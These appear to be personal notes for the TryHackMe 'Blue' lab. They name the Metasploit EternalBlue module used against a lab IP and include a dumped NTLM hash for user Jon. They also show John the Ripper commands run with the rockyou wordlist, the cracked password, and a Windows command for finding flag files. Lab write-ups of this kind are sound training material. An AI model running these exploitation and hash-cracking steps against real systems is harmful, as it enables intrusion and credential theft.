# Try Hacke Me : Blue
```
export IP = 10.10.241.213


Exploit Modudle : windows/smb/ms17_010_eternalblue


[+] nmap informaiton
: Reference -> BlueScan.txt


[+] passowrd Crack with john command
JonPwd.txt == Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
: john --format=LM JonPwd.txt -w=rockyou.txt

======================== John The ripper Result ========================
john --format=NT JonPwd.txt -w=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x4])
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:00 DONE (2020-07-27 17:20) 1.587g/s 16191Kp/s 16191Kc/s 16191KC/s alqke65..alpis
Use the "--show --format=NT" options to display all of the cracked passwords reliably
========================================================================


[+] Find the flag1~3.txt command (window shell command)
: dir /s \flag* 

```